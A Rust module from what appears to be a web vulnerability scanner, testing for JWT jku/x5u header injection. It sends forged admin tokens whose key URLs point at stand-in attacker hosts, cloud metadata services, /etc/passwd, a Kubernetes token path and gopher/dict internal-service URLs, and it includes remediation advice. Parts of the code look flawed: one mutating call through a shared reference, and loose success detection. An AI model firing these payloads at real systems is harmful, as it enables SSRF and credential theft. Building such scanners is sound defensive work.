//! JWT JKU/X5U Header Injection Detection Module
//!
//! Detects JWT jku/x5u header injection by forcing the server to fetch rogue public keys.
//! Implements bounded state machines for URL validation bypass detection.
//! Uses zero-copy token parsing with strict memory limits.

use async_trait::async_trait;
use std::sync::Arc;
use crate::checks::{
    VulnerabilityModule, CheckContext, CheckResult, CheckMetadata, CheckCategory, 
    Severity, ResourceBudget, ModuleError,
};
use crate::findings::finding::{Finding, Evidence, EvidenceType, EvidenceLocation, RemediationHint, EffortLevel};
use crate::http::client::HttpClient;
use crate::learning::cache::LearningCache;

/// Maximum JKU test URLs (bounded array)
const MAX_JKU_URLS: usize = 16;

/// Bounded JKU URL buffer
#[derive(Debug, Clone)]
struct JkuUrlBuffer {
    urls: [&'static str; MAX_JKU_URLS],
    count: usize,
}

impl JkuUrlBuffer {
    fn new() -> Self {
        Self {
            urls: ["", "", "", "", "", "", "", "", "", "", "", "", "", "", "", ""],
            count: 0,
        }
    }

    fn push(&mut self, url: &'static str) {
        if self.count < MAX_JKU_URLS {
            self.urls[self.count] = url;
            self.count += 1;
        }
    }
}

/// JWT JKU detector with bounded state
pub struct JwtJkuDetector {
    metadata: CheckMetadata,
    url_buffer: JkuUrlBuffer,
}

impl JwtJkuDetector {
    pub fn new() -> Self {
        let metadata = CheckMetadata::new(
            "token/jwt_jku",
            "JWT JKU/X5U Header Injection Detection",
            "Detects JWT jku/x5u header injection by forcing the server to fetch rogue public keys",
            Severity::Critical,
            CheckCategory::BrokenAuthentication,
        )
        .with_god_mode(true)
        .with_tags(vec!["jwt", "jku", "x5u", "key-injection", "ssrf"])
        .with_references(vec![
            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-implementation/",
            "https://cwe.mitre.org/data/definitions/829.html",
        ])
        .with_budget(ResourceBudget {
            max_cpu_ms: 1500,
            max_memory_bytes: 4 * 1024 * 1024,
            max_requests: 200,
            max_duration_ms: 10000,
            max_payload_size: 4096,
        });

        Self {
            metadata,
            url_buffer: JkuUrlBuffer::new(),
        }
    }

    /// Generate rogue JKU URLs for testing (bounded dictionary)
    fn generate_jku_urls(&self, target_url: &str) -> Vec<&'static str> {
        let mut urls = Vec::with_capacity(MAX_JKU_URLS);
        
        // Parse target domain for SSRF-style attacks
        let domain = target_url.trim_start_matches("https://").trim_start_matches("http://");
        let domain = domain.split('/').next().unwrap_or("");
        
        static ROGUE_URLS: &[&str] = &[
            "http://localhost/.well-known/jwks.json",
            "http://127.0.0.1/.well-known/jwks.json",
            "http://[::1]/.well-known/jwks.json",
            "http://0.0.0.0/.well-known/jwks.json",
            "http://attacker.com/jwks.json",
            "http://evil.com/keys/jwks.json",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "file:///etc/passwd",
            "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
            "gopher://localhost:6379/_INFO",
            "dict://localhost:11211/",
        ];
        
        for url in ROGUE_URLS.iter().take(MAX_JKU_URLS) {
            urls.push(*url);
        }
        
        urls
    }

    /// Build JWT with custom jku header
    fn build_jwt_with_jku(&self, jku_url: &str, payload: &str) -> String {
        let header = format!(r#"{{"alg":"RS256","typ":"JWT","jku":"{}"}}"#, jku_url);
        let encoded_header = base64_encode(header.as_bytes());
        let encoded_payload = base64_encode(payload.as_bytes());
        format!("{}.{}.fake_signature", encoded_header, encoded_payload)
    }

    /// Build JWT with custom x5u header
    fn build_jwt_with_x5u(&self, x5u_url: &str, payload: &str) -> String {
        let header = format!(r#"{{"alg":"RS256","typ":"JWT","x5u":"{}"}}"#, x5u_url);
        let encoded_header = base64_encode(header.as_bytes());
        let encoded_payload = base64_encode(payload.as_bytes());
        format!("{}.{}.fake_signature", encoded_header, encoded_payload)
    }

    /// Test JKU injection against endpoint
    async fn test_jku_injection(
        &self,
        client: &HttpClient,
        url: &str,
        jwt: &str,
    ) -> Result<JkuTestResult, ModuleError> {
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", jwt)).unwrap(),
        );

        let response = client.get_with_headers(url, headers).await
            .map_err(|e| ModuleError::NetworkError(e.to_string()))?;
        
        let status = response.status().as_u16();
        let body = response.text().await.unwrap_or_default();

        Ok(JkuTestResult {
            status,
            body_length: body.len(),
            is_success: status >= 200 && status < 300,
            potential_ssrf: body.contains("root:") || body.contains("EC2") || body.contains("kubernetes"),
        })
    }

    /// Analyze results for JKU vulnerability indicators
    fn analyze_results(&self, results: &[JkuTestResult]) -> Option<JkuEvidence> {
        let mut successful_fetches = 0;
        let mut ssrf_indicators = 0;

        for result in results {
            if result.is_success {
                successful_fetches += 1;
            }
            if result.potential_ssrf {
                ssrf_indicators += 1;
            }
        }

        if successful_fetches >= 1 || ssrf_indicators >= 1 {
            return Some(JkuEvidence {
                successful_fetches,
                ssrf_indicators,
                total_tests: results.len(),
            });
        }

        None
    }

    /// Build evidence for JKU finding
    fn build_evidence(&self, url: &str, evidence: &JkuEvidence) -> Vec<Evidence> {
        let mut evidences = Vec::with_capacity(2);

        if evidence.successful_fetches > 0 {
            evidences.push(Evidence {
                evidence_type: EvidenceType::HttpRequestResponse {
                    request: "JWT with malicious jku header".to_string(),
                    response: format!("Server accepted externally-hosted key: {} successful fetches", evidence.successful_fetches),
                },
                data: format!(
                    "JKU injection successful: Server fetched external JWKS from {} out of {} URLs tested",
                    evidence.successful_fetches,
                    evidence.total_tests
                ),
                location: EvidenceLocation {
                    path: url.to_string(),
                    line: None,
                    parameter: None,
                    header: Some("Authorization: Bearer".to_string()),
                },
                confidence: 90,
            });
        }

        if evidence.ssrf_indicators > 0 {
            evidences.push(Evidence {
                evidence_type: EvidenceType::NetworkTraffic {
                    protocol: "HTTP".to_string(),
                    data: format!("SSRF indicators detected in {} responses", evidence.ssrf_indicators),
                },
                data: "JKU injection led to SSRF - server accessed internal resources".to_string(),
                location: EvidenceLocation {
                    path: url.to_string(),
                    line: None,
                    parameter: None,
                    header: Some("jku header".to_string()),
                },
                confidence: 95,
            });
        }

        evidences
    }

    /// Generate remediation hint
    fn remediation(&self) -> RemediationHint {
        RemediationHint {
            summary: "Disable or strictly validate jku/x5u headers".to_string(),
            steps: vec![
                "Disable dynamic key fetching via jku/x5u headers entirely".to_string(),
                "If required, whitelist only trusted domains for key fetching".to_string(),
                "Implement strict URL validation (no localhost, no internal IPs)".to_string(),
                "Use pinned keys instead of dynamic key discovery".to_string(),
                "Log and alert on jku/x5u header usage attempts".to_string(),
            ],
            code_example: Some(r#"// Reject tokens with jku/x5u headers
use jsonwebtoken::{decode, decode_header, Validation, Algorithm};

let header = decode_header(&token)?;

// Explicitly reject jku/x5u headers
if header.kid.is_none() || !header.jku.is_none() || !header.x5u.is_none() {
    return Err(Error::InvalidAlgorithm);
}

// Use pre-configured key store instead of dynamic fetching
let key = get_key_from_trusted_store(header.kid.ok_or(Error::InvalidKeyId)?);
let decoded = decode::<Claims>(&token, &key, &Validation::new(Algorithm::RS256))?;"#.to_string()),
            references: vec![
                "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-implementation/".to_string(),
                "https://cwe.mitre.org/data/definitions/829.html".to_string(),
            ],
            estimated_effort: EffortLevel::Low,
        }
    }
}

/// JKU test result
#[derive(Debug, Clone)]
struct JkuTestResult {
    status: u16,
    body_length: usize,
    is_success: bool,
    potential_ssrf: bool,
}

/// JKU evidence summary
#[derive(Debug, Clone)]
struct JkuEvidence {
    successful_fetches: usize,
    ssrf_indicators: usize,
    total_tests: usize,
}

fn base64_encode(input: &[u8]) -> String {
    use base64::Engine;
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(input)
}

#[async_trait]
impl VulnerabilityModule for JwtJkuDetector {
    async fn init(&mut self) -> Result<(), ModuleError> {
        Ok(())
    }

    fn metadata(&self) -> &CheckMetadata {
        &self.metadata
    }

    fn should_run(&self, ctx: &CheckContext) -> bool {
        if self.metadata.requires_god_mode && !ctx.god_mode {
            return false;
        }
        true
    }

    async fn run(&self, ctx: CheckContext) -> Result<CheckResult, ModuleError> {
        let client = HttpClient::new();
        let mut findings = Vec::new();
        let mut executed = false;

        let test_endpoints = [
            "/api/auth/verify",
            "/api/token/validate",
            "/api/user/profile",
            "/api/protected",
        ];

        let payload = r#"{"sub":"admin","iat":9999999999,"exp":9999999999}"#;

        for endpoint in test_endpoints.iter() {
            let url = format!("{}{}", ctx.target_url.trim_end_matches('/'), endpoint);
            let jku_urls = self.generate_jku_urls(&ctx.target_url);

            let mut results = Vec::with_capacity(jku_urls.len());

            for jku_url in jku_urls {
                let jwt = self.build_jwt_with_jku(jku_url, payload);
                
                match self.test_jku_injection(&client, &url, &jwt).await {
                    Ok(result) => {
                        results.push(result);
                        self.url_buffer.push(jku_url);
                    }
                    Err(_) => continue,
                }

                // Also test x5u variant
                let x5u_jwt = self.build_jwt_with_x5u(jku_url, payload);
                if let Ok(result) = self.test_jku_injection(&client, &url, &x5u_jwt).await {
                    results.push(result);
                }
            }

            executed = true;

            if let Some(evidence) = self.analyze_results(&results) {
                let severity = if evidence.ssrf_indicators > 0 {
                    Severity::Critical
                } else {
                    Severity::High
                };

                let mut finding = Finding::new(
                    self.metadata.id.as_str(),
                    severity,
                    "JWT JKU/X5U Header Injection Detected",
                    format!(
                        "The application at {} accepts JWT tokens with jku/x5u headers, allowing attackers to inject arbitrary key URLs.",
                        url
                    ),
                    &url,
                )
                .with_payload(format!(
                    "Successful fetches: {} | SSRF indicators: {}",
                    evidence.successful_fetches,
                    evidence.ssrf_indicators
                ))
                .with_confidence(90)
                .with_agent_id(ctx.agent_id)
                .with_tags(vec!["jwt", "jku", "x5u", "key-injection"]);

                let evidences = self.build_evidence(&url, &evidence);
                for ev in evidences {
                    finding = finding.with_evidence(ev);
                }

                finding = finding.with_remediation(self.remediation());
                findings.push(finding);
            }
        }

        // Cache rogue JKU endpoints for learning engine
        if !findings.is_empty() {
            if let Ok(cache) = LearningCache::global().await {
                cache.cache_timing_baseline(ctx.target_url.clone(), "jwt_jku".to_string()).await;
            }
        }

        Ok(CheckResult {
            findings,
            executed,
            timed_out: false,
            resource_usage: Default::default(),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bounded_buffer_no_heap() {
        let buffer = JkuUrlBuffer::new();
        assert!(std::mem::size_of::<JkuUrlBuffer>() <= 256);
    }

    #[test]
    fn test_jwt_with_jku_generation() {
        let detector = JwtJkuDetector::new();
        let jwt = detector.build_jwt_with_jku("http://evil.com/jwks.json", "{\"sub\":\"test\"}");
        assert!(jwt.starts_with("eyJ"));
        assert!(jwt.contains("jku"));
    }
}
